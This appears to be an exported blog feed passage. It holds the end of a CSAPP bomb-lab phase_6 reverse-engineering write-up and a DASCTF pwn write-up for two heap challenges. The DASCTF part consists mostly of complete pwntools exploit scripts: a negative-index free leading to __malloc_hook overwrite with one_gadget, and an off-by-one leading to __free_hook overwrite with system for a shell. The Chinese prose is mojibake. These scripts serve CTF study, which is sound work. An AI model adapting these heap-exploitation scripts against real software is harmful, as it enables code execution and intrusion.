class="built_in">PTR</span> [<span class="built_in">rcx</span>+<span class="number">0x8</span>],<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011c4</span> &lt;+<span class="number">208</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rax</span>,<span class="number">0x8</span></span><br><span class="line"><span class="number">0x00000000004011c8</span> &lt;+<span class="number">212</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">rax</span>,<span class="built_in">rsi</span></span><br><span class="line"><span class="number">0x00000000004011cb</span> &lt;+<span class="number">215</span>&gt;:<span class="keyword">je</span>     <span class="number">0x4011d2</span> &lt;phase_6+<span class="number">222</span>&gt;</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011cd</span> &lt;+<span class="number">217</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rcx</span>,<span class="built_in">rdx</span></span><br><span class="line"><span class="number">0x00000000004011d0</span> &lt;+<span class="number">220</span>&gt;:<span class="keyword">jmp</span>    <span class="number">0x4011bd</span> &lt;phase_6+<span class="number">201</span>&gt;</span><br><span class="line"># end  éå†å…­ä¸ªnode</span><br><span class="line"><span class="number">0x00000000004011d2</span> &lt;+<span class="number">222</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rdx</span>+<span class="number">0x8</span>],<span class="number">0x0</span></span><br><span class="line"><span class="number">0x00000000004011da</span> &lt;+<span class="number">230</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">ebp</span>,<span class="number">0x5</span></span><br><span class="line"><span class="number">0x00000000004011df</span> &lt;+<span class="number">235</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rax</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011e3</span> &lt;+<span class="number">239</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">eax</span>,<span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rax</span>]</span><br><span class="line"><span class="number">0x00000000004011e5</span> &lt;+<span class="number">241</span>&gt;:<span class="keyword">cmp</span>    <span class="built_in">DWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>],<span class="built_in">eax</span></span><br><span class="line"><span class="number">0x00000000004011e7</span> &lt;+<span class="number">243</span>&gt;:<span class="keyword">jge</span>    <span class="number">0x4011ee</span> &lt;phase_6+<span class="number">250</span>&gt;</span><br><span class="line"># å¦‚æœå‰ä¸€ä¸ªèŠ‚ç‚¹å¤§äºåä¸€ä¸ªèŠ‚ç‚¹åˆ™ä¸ä¼šè·³è½¬</span><br><span class="line"></span><br><span class="line"><span class="number">0x00000000004011e9</span> &lt;+<span class="number">245</span>&gt;:<span class="keyword">call</span>   <span class="number">0x40143a</span> &lt;explode_bomb&gt;</span><br><span class="line"><span class="number">0x00000000004011ee</span> &lt;+<span class="number">250</span>&gt;:<span class="keyword">mov</span>    <span class="built_in">rbx</span>,<span class="built_in">QWORD</span> <span class="built_in">PTR</span> [<span class="built_in">rbx</span>+<span class="number">0x8</span>]</span><br><span class="line"><span class="number">0x00000000004011f2</span> &lt;+<span class="number">254</span>&gt;:<span class="keyword">sub</span>    <span class="built_in">ebp</span>,<span class="number">0x1</span></span><br><span class="line"><span class="number">0x00000000004011f5</span> &lt;+<span class="number">257</span>&gt;:<span class="keyword">jne</span>    <span class="number">0x4011df</span> &lt;phase_6+<span class="number">235</span>&gt;</span><br><span class="line"><span class="number">0x00000000004011f7</span> &lt;+<span class="number">259</span>&gt;:<span class="keyword">add</span>    <span class="built_in">rsp</span>,<span class="number">0x50</span></span><br><span class="line"><span class="number">0x00000000004011fb</span> &lt;+<span class="number">263</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbx</span></span><br><span class="line"><span class="number">0x00000000004011fc</span> &lt;+<span class="number">264</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">rbp</span></span><br><span class="line"><span class="number">0x00000000004011fd</span> &lt;+<span class="number">265</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r12</span></span><br><span class="line"><span class="number">0x00000000004011ff</span> &lt;+<span class="number">267</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r13</span></span><br><span class="line"><span class="number">0x0000000000401201</span> &lt;+<span class="number">269</span>&gt;:<span class="keyword">pop</span>    <span class="built_in">r14</span></span><br><span class="line"><span class="number">0x0000000000401203</span> &lt;+<span class="number">271</span>&gt;:<span class="keyword">ret</span>    </span><br></pre></td></tr></table></figure><p>å¯¹æ¯”äº†nodeèŠ‚ç‚¹ä¸­çš„æ•°æ®çš„å¤§å°ï¼Œæˆ‘ä»¬é‡å¯ç¨‹åºï¼ŒæŸ¥çœ‹åŸç”Ÿçš„nodeèŠ‚ç‚¹æƒ…å†µå¦‚ä¸‹</p><figure class="highlight c"><table><tr><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">32</span>gx <span class="number">0x6032d0</span></span><br><span class="line"><span class="number">0x6032d0</span> &lt;node1&gt;:<span class="number">0x000000010000014c</span><span class="number">0x00000000006032e0</span></span><br><span class="line"><span class="number">0x6032e0</span> &lt;node2&gt;:<span class="number">0x00000002000000a8</span><span class="number">0x00000000006032f0</span></span><br><span class="line"><span class="number">0x6032f0</span> &lt;node3&gt;:<span class="number">0x000000030000039c</span><span class="number">0x0000000000603300</span></span><br><span class="line"><span class="number">0x603300</span> &lt;node4&gt;:<span class="number">0x00000004000002b3</span><span class="number">0x0000000000603310</span></span><br><span class="line"><span class="number">0x603310</span> &lt;node5&gt;:<span class="number">0x00000005000001dd</span><span class="number">0x0000000000603320</span></span><br><span class="line"><span class="number">0x603320</span> &lt;node6&gt;:<span class="number">0x00000006000001bb</span><span class="number">0x0000000000000000</span></span><br></pre></td></tr></table></figure><p>å¤§å°é¡ºåºä¸º 3 4 5 6 1 2<br>é‚£ä¹ˆå˜æ¢åæ˜¯è¿™äº›ï¼Œå˜æ¢å‰å°±æ˜¯ 4 3 2 1 6 5</p><p><img src="https://i.loli.net/2021/06/15/8TIOF7ofxShwHuX.png" alt=""></p><h2 id="åé¦ˆä¸æ€»ç»“"><a href="#åé¦ˆä¸æ€»ç»“" class="headerlink" title="åé¦ˆä¸æ€»ç»“"></a>åé¦ˆä¸æ€»ç»“</h2><p>  é€šè¿‡è¿™ä¸ªå®éªŒå¤ä¹ äº†ä¸€äº›æ±‡ç¼–çš„çŸ¥è¯†ï¼Œå¾ˆå¤§æ”¶è·ï¼Œä¹‹å‰ä¹ æƒ¯äºçœ‹cä»£ç ï¼Œæ‰å‘ç°è¯»æ±‡ç¼–çš„èƒ½åŠ›æ˜¯å¦‚æ­¤ä¹‹å¼±</p><ol><li>objdump -d -m æŒ‡ä»¤æ ¼å¼ ./binary_file &gt; xxx.asm  åæ±‡ç¼–å‡ºæ–‡ä»¶</li><li>å‡½æ•°çš„è¿ç»­è°ƒç”¨çš„å¯„å­˜å™¨å‚æ•°å˜åŒ–ï¼Œä¾ç„¶æ˜¯rdiç­‰å¯„å­˜å™¨ä¼ è¿›å»</li><li>æ¯…åŠ›ï¼Œè‡ªåˆ¶åŠ›å’Œä¸“æ³¨åŠ›</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> csapp </tag>
            
            <tag> cmu lab </tag>
            
            <tag> reverse </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF-MAY pwn wp</title>
      <link href="2021/06/05/DASCTF-MAY/"/>
      <url>2021/06/05/DASCTF-MAY/</url>
      
        <content type="html"><![CDATA[<p>ä¸¤é“é¢˜éƒ½æ¯”è¾ƒä¸­è§„ä¸­çŸ©ï¼Œç¬¬äºŒä¸ªæ¯”ç¬¬ä¸€ä¸ªè¿˜ç®€å•ï¼Œç¬¬ä¸€ä¸ªæ¯”èµ›ä¸€å¼€å§‹æƒ³æ­ªäº†ï¼Œåšäº†å¾ˆjbä¹…ï¼Œç¬¬äºŒä¸ªåå‡ åˆ†é’Ÿå°±å‡ºäº†</p><h2 id="ticket"><a href="#ticket" class="headerlink" title="ticket"></a>ticket</h2><p>ä¸€ä¸ªæ¯”è¾ƒå…¸å‹çš„å †èœå•é¢˜ç›®</p><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é€†å‘çš„è¯å€’æ˜¯ä¸éš¾ï¼Œç›´æ¥çœ‹æ¼æ´ï¼Œé¦–å…ˆæ˜¯freeä¸­ï¼Œä¸€çœ¼çœ‹è¿‡å»å‘ç°è¿™ä¸å°±æ˜¯uafä¹ˆï¼Œfreeçš„æ˜¯æŒ‡é’ˆï¼Œæœ¬åº”è¯¥æ¸…ç©ºæŒ‡é’ˆå’Œsizeï¼Œå´åªæ¸…ç©ºäº†size</p><p><img src="https://i.loli.net/2021/06/05/1PVwZi3z5eNS98B.png" alt=""></p><p>ä½†æ˜¯åæœŸè°ƒè¯•çš„æ—¶å€™å‘ç°å¹¶ä¸æ˜¯è¿™æ ·çš„ï¼Œå› ä¸ºæ‰€æœ‰çš„editå’ŒshowåŠŸèƒ½éƒ½æ˜¯æ ¹æ®sizeæ¥åˆ¤æ–­çš„ï¼Œä¹Ÿå°±æ˜¯ç›¸å½“äºæ¸…ç©ºäº†æŒ‡é’ˆï¼Œè¿™ä¸ªåœ°æ–¹å¹¶ä¸å­˜åœ¨uaf</p><p>ç„¶ååˆä»”ç»†ä¸€çœ‹ï¼Œå‘ç°çœŸæ­£çš„æ¼æ´å…¶å®åœ¨è¿™ã€‚<br><img src="https://i.loli.net/2021/06/05/5khUEDn8WRHNi1u.png" alt=""></p><p>freeçš„æ—¶å€™æ²¡æœ‰åˆ¤æ–­indexå°äº0çš„æƒ…å†µï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘ä»¬å¯ä»¥ä»¥bssä¸­çš„å­˜æ”¾å †æŒ‡é’ˆçš„ä½ç½®ä¸ºåæ ‡åŸç‚¹ï¼Œå‘ä¹‹å‰çš„åœ°å€è¿›è¡Œfreeï¼Œçªç„¶è”æƒ³åˆ°äº†ä¹‹å‰è®©è¾“å…¥å§“åï¼Œå¯èƒ½å°±æ˜¯ç»™æˆ‘ä»¬ä¼ªé€ å †åœ°å€åˆ›é€ äº†æ¡ä»¶ï¼Œæˆ‘ä»¬è¿›å…¥gdbæ¥æŸ¥çœ‹ä»–ä»¬æ˜¯å¦‚ä½•åˆ†å¸ƒçš„ã€‚</p><p><img src="https://i.loli.net/2021/06/05/lIa76K9eDxZ3fFP.png" alt=""><br>å‘ç°è¿™ä¸å°±åœ¨å †æŒ‡é’ˆçš„ä¸Šæ–¹ä¹ˆï¼Œæ‰€ä»¥å¾ˆè‡ªç„¶çš„æ€è·¯å°±å‡ºæ¥äº†ï¼Œå°±æ˜¯å‘å‰freeï¼Œç”¨ä¹‹å‰èƒ½å¤Ÿè¾“å…¥çš„ageå½“åšå †æŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªä¼ªé€ çš„chunkï¼Œè¿™ä¸ªä¼ªé€ çš„chunkå¯ä»¥ç”±æˆ‘ä»¬æ¥æ„é€ å †å—çš„sizeæ¥å†³å®šã€‚</p><p>å¦‚ä¸‹éƒ¨åˆ†exp<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># é¦–å…ˆæ˜¯å…ˆæ³„éœ²å‡ºæ¥libcåœ°å€ï¼Œè¿™ä¸ªç®€å•ï¼Œfree unsorted binåå†å–å›æ¥å°±å¯ä»¥äº†</span></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br></pre></td></tr></table></figure></p><p>ç„¶åæ˜¯æœ¬é¢˜çš„ç²¾å<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line"><span class="comment"># free(-3)</span></span><br></pre></td></tr></table></figure></p><p>æ•ˆæœæ˜¯è¿™æ ·çš„<br><img src="https://i.loli.net/2021/06/05/1DxdUwI9jASg7kB.png" alt=""></p><p>ç„¶åfree(-3)ï¼Œé‚£ä¸ªä¼ªé€ çš„chunkå°±è¿›å…¥åˆ°biné‡Œäº†</p><p>ç„¶åç”³è¯·å›æ¥ï¼Œæ”¹sizeä¸º0çš„è¯å¯ä»¥è·å¾—çœŸæ­£uafçš„èƒ½åŠ›ï¼Œåé¢å°±ç®€å•äº†</p><h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">1</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&quot;./ticket&quot;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc-2.23.so&#x27;</span></span><br><span class="line">port = <span class="number">26007</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, <span class="number">27113</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fillInfo</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendafter(<span class="string">&quot;Your name:&quot;</span>, name)</span><br><span class="line">    p.sendafter(<span class="string">&quot;what do you want to say before take off(wu hu qi fei):&quot;</span>, say)</span><br><span class="line">    p.sendafter(<span class="string">&quot;Your age:&quot;</span>, <span class="built_in">str</span>(age))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Index:&quot;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Remarks size:&#x27;</span>, <span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;Your remarks:&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_info</span>(<span class="params">name, say, age</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;5&#x27;</span>)</span><br><span class="line">    fillInfo(name, say, age)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_info</span>():</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;6&#x27;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line">fillInfo(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x20</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">2</span>, <span class="number">0xd0</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x21</span>)</span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x60</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">__malloc_hook = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">296</span> - <span class="number">0x10</span></span><br><span class="line">libc_base = __malloc_hook - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE ===&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x21</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x21</span>)</span><br><span class="line">edit_info(<span class="string">&quot;aaaa&quot;</span>, <span class="string">&quot;bbbb&quot;</span>, <span class="number">0x6020e0</span>)</span><br><span class="line">free(-<span class="number">3</span>)</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x10</span>)</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line">edit(<span class="number">2</span>, p64(__malloc_hook - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x60</span>)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x60</span>)</span><br><span class="line">og = [<span class="number">0x45216</span>, <span class="number">0x4526a</span>, <span class="number">0xf02a4</span>, <span class="number">0xf1147</span>]</span><br><span class="line">edit(<span class="number">3</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x13</span> + p64(og[<span class="number">3</span>] + libc_base))</span><br><span class="line">edit(<span class="number">0</span>, p64(<span class="number">0x70</span>) + p64(<span class="number">0x0</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment"># gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure><h2 id="card"><a href="#card" class="headerlink" title="card"></a>card</h2><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p><img src="https://i.loli.net/2021/06/05/UPpgt2VXkEof6iz.png" alt=""><br>æ¼æ´ç‚¹åœ¨äºè¿™ä¸ªåœ°æ–¹ï¼Œeditçš„æ—¶å€™ç›´æ¥ç”¨sizeå°±å¥½äº†ï¼Œè¿™é‡ŒåååŠ äº†ä¸€ä¸ªv1ï¼Œæ˜æ˜¾æ˜¯æœ‰æ¼æ´ï¼Œç„¶åæˆ‘ä»¬è¿›å…¥overflowå‡½æ•°çœ‹çœ‹</p><p><img src="https://i.loli.net/2021/06/05/ca6LgQMpY1GUyAS.png" alt=""><br>è¿›è¡Œäº†ä¸€äº›åˆ—èœœæ±æ“ä½œï¼Œçœ‹ä¸æ‡‚é—®é¢˜ä¸å¤§ï¼Œåæ­£å°±æ˜¯è¿™ä¹ˆä¸ªé€»è¾‘ï¼Œè¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼åŠ ä¸Šsizeä½œä¸ºeditçš„sizeï¼Œé‚£ä¹ˆåªè¦è¿™ä¸ªå‡½æ•°çš„è¿”å›å€¼æ˜¯1ï¼Œé‚£ä¹ˆå°±ç›¸å½“äºæº¢å‡ºäº†ä¸€ä¸ªå­—èŠ‚å‘—</p><p>å†™ä¸ªè„šæœ¬æ¥çœ‹çœ‹ï¼Œç›´æ¥ç”¨é‚£ä¸ªoverflowçš„é€»è¾‘ï¼Œç¨å¾®æ”¹æ”¹å°±è¡Œäº†ï¼Œå¦‚æœè¿”å›å€¼ä¸æ˜¯0ï¼Œé‚£ä¹ˆå°±è¾“å‡ºï¼Œçœ‹çœ‹å“ªäº›sizeæ˜¯å¯ç”¨çš„<br><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">size = []</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">257</span>):</span><br><span class="line">    <span class="keyword">if</span> ((((((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>) + i) &amp; <span class="number">0xF</span>) - ((i &gt;&gt; <span class="number">31</span>) &gt;&gt; <span class="number">28</span>)) &gt;&gt; <span class="number">3</span>):</span><br><span class="line">        size.append(<span class="built_in">hex</span>(i))</span><br><span class="line">print(<span class="built_in">len</span>(size))</span><br><span class="line">print(size)</span><br></pre></td></tr></table></figure></p><p><img src="https://i.loli.net/2021/06/05/BZgo3sP8ThXI5Nb.png" alt=""></p><p>é‚£å°±ç›´æ¥ç”¨0x?8çš„åœ°å€å°±å¯ä»¥äº†<br>æ‰€ä»¥è¿™é“é¢˜å°±è½¬å˜ä¸ºäº†libc-2.27ä¸‹çš„off-by-one<br>ï¼ˆlibcç‰ˆæœ¬ä¸ºGLIBC 2.27-3ubuntu1ï¼Œå°šæ— keyæœºåˆ¶ï¼Œä¸è¿‡è¿™é“é¢˜å¥½åƒä¹Ÿæ— éœ€å…³å¿ƒè¿™ä¸€ç‚¹ï¼‰</p><h3 id="exp-1"><a href="#exp-1" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">local = <span class="number">0</span></span><br><span class="line"></span><br><span class="line">binary = <span class="string">&#x27;./pwn&#x27;</span></span><br><span class="line">libc_path = <span class="string">&#x27;./libc.so&#x27;</span></span><br><span class="line">port = <span class="number">29844</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> local == <span class="number">1</span>:</span><br><span class="line">    p = process(binary)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = remote(<span class="string">&#x27;node3.buuoj.cn&#x27;</span>, port)</span><br><span class="line"></span><br><span class="line">context.terminal = [<span class="string">&#x27;tmux&#x27;</span>, <span class="string">&#x27;splitw&#x27;</span>, <span class="string">&#x27;-h&#x27;</span>]</span><br><span class="line"></span><br><span class="line">libc = ELF(libc_path)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dbg</span>():</span></span><br><span class="line">    context.log_level = <span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span>(<span class="params">index, size, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendlineafter(<span class="string">&quot;Infuse power:&quot;</span>, <span class="built_in">str</span>(size))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;quickly!&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params">index, content</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;please choice your card&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line">    p.sendafter(<span class="string">&#x27;start your bomb show&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">free</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;3&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;Which card:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;choice:&#x27;</span>, <span class="string">&#x27;4&#x27;</span>)</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;index:&#x27;</span>, <span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">8</span>):</span><br><span class="line">    add(i, <span class="number">0x80</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">add(<span class="number">8</span>, <span class="number">0x10</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line">free(<span class="number">7</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x20</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">&quot;\x7f&quot;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&#x27;\x00&#x27;</span>)) - <span class="number">289</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">success(<span class="string">&quot;LIBC BASE =====&gt; &quot;</span> + <span class="built_in">hex</span>(libc_base))</span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    add(i, <span class="number">0xe0</span>, <span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">    free(i)</span><br><span class="line"></span><br><span class="line"><span class="comment"># dbg()</span></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, <span class="string">&#x27;aaaa&#x27;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x68</span>, <span class="string">&#x27;bbbb&#x27;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, <span class="string">&#x27;cccc&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = <span class="number">0x70</span> * <span class="string">b&#x27;a&#x27;</span> + p64(<span class="number">0</span>) + p8(<span class="number">0xf1</span>) </span><br><span class="line">edit(<span class="number">0</span>, payload)</span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x90</span>, <span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">edit(<span class="number">2</span>, <span class="string">b&#x27;\x00&#x27;</span> * <span class="number">0x70</span> + p64(<span class="number">0xf0</span>))</span><br><span class="line"></span><br><span class="line">free(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x68</span>, <span class="string">&#x27;dddd&#x27;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, <span class="string">&#x27;eeee&#x27;</span>)</span><br><span class="line"></span><br><span class="line">free(<span class="number">2</span>)</span><br><span class="line">__free_hook = libc_base + libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>]</span><br><span class="line">system = libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]</span><br><span class="line">edit(<span class="number">5</span>, p64(__free_hook))</span><br><span class="line"></span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x70</span>, <span class="string">&quot;HACKER&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x70</span>, p64(system))</span><br><span class="line">free(<span class="number">3</span>)</span><br><span 